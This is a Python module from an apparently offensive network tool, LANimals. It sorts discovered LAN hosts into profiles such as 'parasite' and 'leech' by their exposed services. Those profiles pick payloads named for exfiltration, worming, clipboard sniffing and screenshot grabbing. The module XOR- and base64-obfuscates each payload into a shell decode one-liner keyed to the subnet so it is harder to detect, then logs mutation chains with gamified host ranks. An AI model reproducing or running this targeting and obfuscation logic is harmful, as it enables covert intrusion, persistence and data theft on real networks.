from __future__ import annotations

"""
LANimals :: PersonalityEngine
Ported and integrated from LANIMORPH.

Assigns behavioral personalities to discovered hosts based on their
risk profile and observable signals. Personalities drive payload
selection and mutation strategy.

Personalities:
  scout    - low aggression, high stealth, observation mode
  mimic    - blends in, mirrors traffic patterns
  parasite - persistent, medium stealth, resource extraction
  leech    - passive, DNS-focused, long dwell time
"""

import json
import zlib
import base64
import sqlite3
import threading
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

ROOT = Path(__file__).resolve().parent.parent
DB_PATH = ROOT / "tmp" / "lanimals.db"
_lock = threading.Lock()

# ── Personality definitions ───────────────────────────────────────────────────

PERSONALITIES: Dict[str, Dict[str, Any]] = {
    "scout": {
        "aggression": 2,
        "stealth": 10,
        "persistence": 6,
        "description": "Passive observer. Maps and fingerprints without interaction.",
        "preferred_payloads": ["fingerprint_dump", "mdns_grabber", "router_fingerprint"],
        "risk_threshold": (0, 30),
    },
    "mimic": {
        "aggression": 4,
        "stealth": 9,
        "persistence": 5,
        "description": "Blends into normal traffic. Mirrors observed patterns.",
        "preferred_payloads": ["fake_dns_listener", "polymorph_mutator"],
        "risk_threshold": (25, 55),
    },
    "parasite": {
        "aggression": 7,
        "stealth": 5,
        "persistence": 9,
        "description": "Persistent extraction. High dwell, moderate visibility.",
        "preferred_payloads": ["encrypted_exfil", "lan_worm", "clip_sniff"],
        "risk_threshold": (50, 80),
    },
    "leech": {
        "aggression": 3,
        "stealth": 8,
        "persistence": 10,
        "description": "Long dwell, DNS-focused passive extraction.",
        "preferred_payloads": ["fake_dns_listener", "zip_finder", "screenshot_grabber"],
        "risk_threshold": (0, 100),
    },
}


# ── DB migration ──────────────────────────────────────────────────────────────

def init_personality_tables() -> None:
    """Add personality and mutation chain tables to existing LANimals DB."""
    with _lock:
        c = sqlite3.connect(str(DB_PATH), check_same_thread=False)
        c.execute("PRAGMA journal_mode=WAL")
        c.executescript("""
        CREATE TABLE IF NOT EXISTS host_personalities (
            ip              TEXT PRIMARY KEY,
            personality     TEXT NOT NULL DEFAULT 'scout',
            aggression      INTEGER DEFAULT 2,
            stealth         INTEGER DEFAULT 10,
            persistence     INTEGER DEFAULT 6,
            assigned_at     TEXT,
            reason          TEXT
        );

        CREATE TABLE IF NOT EXISTS mutation_chain (
            id              INTEGER PRIMARY KEY AUTOINCREMENT,
            ip              TEXT NOT NULL,
            parent_hash     TEXT,
            child_hash      TEXT,
            xor_key         INTEGER,
            payload_name    TEXT,
            ts              TEXT NOT NULL,
            meta            TEXT DEFAULT '{}'
        );

        CREATE TABLE IF NOT EXISTS host_xp (
            ip              TEXT PRIMARY KEY,
            xp              INTEGER DEFAULT 0,
            rank            TEXT DEFAULT 'unknown',
            mutations       INTEGER DEFAULT 0,
            last_active     TEXT
        );

        CREATE INDEX IF NOT EXISTS idx_mutation_ip ON mutation_chain(ip);
        CREATE INDEX IF NOT EXISTS idx_mutation_ts ON mutation_chain(ts DESC);
        """)
        c.commit()
        c.close()


# ── Personality assignment ────────────────────────────────────────────────────

def assign_personality(
    ip: str,
    risk_score: int,
    services: List[Dict[str, Any]],
    meta: Optional[Dict[str, Any]] = None,
) -> Tuple[str, str]:
    """
    Assign a personality to a host based on its risk profile.
    Returns (personality_name, reason).
    """
    meta = meta or {}
    open_ports = {str(s.get("port", "")) for s in services}
    honeypot_hits = int(meta.get("honeypot_hits", 0))
    has_dns = "53" in open_ports
    has_smb = "445" in open_ports or "139" in open_ports
    has_rdp = "3389" in open_ports

    # Rule-based assignment
    if honeypot_hits > 0:
        personality = "parasite"
        reason = f"Honeypot interaction ({honeypot_hits} hits) — aggressive extraction profile"
    elif has_smb and risk_score >= 50:
        personality = "parasite"
        reason = "SMB exposed + high risk — persistent extraction candidate"
    elif has_rdp and risk_score >= 40:
        personality = "parasite"
        reason = "RDP exposed — persistence-oriented target"
    elif has_dns and risk_score < 40:
        personality = "leech"
        reason = "DNS server with moderate risk — long-dwell passive profile"
    elif risk_score >= 60:
        personality = "mimic"
        reason = "High risk host — stealth mimicry to avoid detection"
    elif risk_score <= 25:
        personality = "scout"
        reason = "Low risk host — passive observation mode"
    else:
        personality = "scout"
        reason = "Default assignment — insufficient signals for specialization"

    _save_personality(ip, personality, reason)
    return personality, reason


def _save_personality(ip: str, personality: str, reason: str) -> None:
    p = PERSONALITIES[personality]
    with _lock:
        c = sqlite3.connect(str(DB_PATH), check_same_thread=False)
        c.execute("""
            INSERT INTO host_personalities
                (ip, personality, aggression, stealth, persistence, assigned_at, reason)
            VALUES (?, ?, ?, ?, ?, ?, ?)
            ON CONFLICT(ip) DO UPDATE SET
                personality=excluded.personality,
                aggression=excluded.aggression,
                stealth=excluded.stealth,
                persistence=excluded.persistence,
                assigned_at=excluded.assigned_at,
                reason=excluded.reason
        """, (
            ip,
            personality,
            p["aggression"],
            p["stealth"],
            p["persistence"],
            datetime.utcnow().isoformat(),
            reason,
        ))
        c.commit()
        c.close()


def get_personality(ip: str) -> Optional[Dict[str, Any]]:
    """Return personality record for a host, or None."""
    c = sqlite3.connect(str(DB_PATH), check_same_thread=False)
    c.row_factory = sqlite3.Row
    row = c.execute(
        "SELECT * FROM host_personalities WHERE ip = ?", (ip,)
    ).fetchone()
    c.close()
    return dict(row) if row else None


def get_all_personalities() -> List[Dict[str, Any]]:
    c = sqlite3.connect(str(DB_PATH), check_same_thread=False)
    c.row_factory = sqlite3.Row
    rows = c.execute("SELECT * FROM host_personalities ORDER BY personality").fetchall()
    c.close()
    return [dict(r) for r in rows]


# ── Subnet mutator (ported from LANIMORPH) ────────────────────────────────────

def derive_key(ip: str) -> int:
    """Derive XOR key from subnet octets."""
    subnet = ".".join(ip.split(".")[:3])
    return sum(int(o) for o in subnet.split(".")) % 256


def mutate_payload(base_payload: str, target_ip: str) -> Tuple[str, str, int]:
    """
    Mutate a payload for a specific target IP using subnet-derived XOR key.
    Returns (mutated_payload, b64_encoded, xor_key).
    """
    key = derive_key(target_ip)
    compressed = zlib.compress(base_payload.encode())
    xored = bytes(b ^ key for b in compressed)
    b64 = base64.b64encode(xored).decode()

    mutated = (
        f"echo '{b64}' | base64 -d | python3 -c \""
        f"import sys,zlib,base64;"
        f"d=base64.b64decode(sys.stdin.read());"
        f"x=bytes(b^{key} for b in d);"
        f"print(zlib.decompress(x).decode())\""
    )
    return mutated, b64, key


def log_mutation(
    ip: str,
    payload_name: str,
    b64: str,
    key: int,
    parent_hash: Optional[str] = None,
) -> None:
    """Record a mutation event in the chain."""
    import hashlib
    child_hash = hashlib.sha256(b64.encode()).hexdigest()[:12]
    with _lock:
        c = sqlite3.connect(str(DB_PATH), check_same_thread=False)
        c.execute("""
            INSERT INTO mutation_chain
                (ip, parent_hash, child_hash, xor_key, payload_name, ts)
            VALUES (?, ?, ?, ?, ?, ?)
        """, (ip, parent_hash, child_hash, key, payload_name, datetime.utcnow().isoformat()))

        # Update XP
        c.execute("""
            INSERT INTO host_xp (ip, xp, mutations, last_active)
            VALUES (?, 10, 1, ?)
            ON CONFLICT(ip) DO UPDATE SET
                xp = xp + 10,
                mutations = mutations + 1,
                last_active = excluded.last_active,
                rank = CASE
                    WHEN xp + 10 >= 100 THEN 'apex'
                    WHEN xp + 10 >= 50  THEN 'active'
                    WHEN xp + 10 >= 20  THEN 'emerging'
                    ELSE 'unknown'
                END
        """, (ip, datetime.utcnow().isoformat()))
        c.commit()
        c.close()


def get_mutation_chain(ip: str) -> List[Dict[str, Any]]:
    """Return full mutation history for a host."""
    c = sqlite3.connect(str(DB_PATH), check_same_thread=False)
    c.row_factory = sqlite3.Row
    rows = c.execute(
        "SELECT * FROM mutation_chain WHERE ip = ? ORDER BY ts DESC",
        (ip,)
    ).fetchall()
    c.close()
    return [dict(r) for r in rows]


def get_xp(ip: str) -> Optional[Dict[str, Any]]:
    c = sqlite3.connect(str(DB_PATH), check_same_thread=False)
    c.row_factory = sqlite3.Row
    row = c.execute("SELECT * FROM host_xp WHERE ip = ?", (ip,)).fetchone()
    c.close()
    return dict(row) if row else None


# ── Smart selector ────────────────────────────────────────────────────────────

def select_payload(ip: str, available_payloads: List[str]) -> Optional[str]:
    """
    Select best payload for a host based on its assigned personality.
    Falls back to random if no personality match found.
    """
    import random
    record = get_personality(ip)
    if not record:
        return random.choice(available_payloads) if available_payloads else None

    personality = record["personality"]
    preferred = PERSONALITIES[personality]["preferred_payloads"]

    matches = [p for p in available_payloads if any(pref in p for pref in preferred)]
    if matches:
        return random.choice(matches)
    return random.choice(available_payloads) if available_payloads else None


# ── Summary ───────────────────────────────────────────────────────────────────

def personality_summary() -> Dict[str, Any]:
    """Return counts by personality type."""
    rows = get_all_personalities()
    counts: Dict[str, int] = {}
    for r in rows:
        p = r["personality"]
        counts[p] = counts.get(p, 0) + 1
    return {
        "total": len(rows),
        "by_personality": counts,
        "personalities": PERSONALITIES,
    }
